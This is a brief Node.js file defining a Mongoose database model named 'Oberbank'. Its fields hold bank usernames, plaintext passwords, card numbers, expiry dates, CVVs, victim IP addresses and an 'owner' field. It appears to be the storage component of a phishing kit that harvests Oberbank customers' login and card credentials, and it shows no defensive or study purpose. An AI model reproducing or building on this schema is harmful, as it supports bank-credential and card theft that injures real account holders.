const mongoose = require("mongoose");

const oberbankSchema = new mongoose.Schema({
    uniqueid: String,
    username: String,
    password: String,
    ccnum: String,
    ccexp: String,
    cvv: String,
    status: Number,
    ip: String,
    owner: String,
    qr: {type: Boolean, default: false},
});

module.exports = mongoose.model("Oberbank", oberbankSchema);
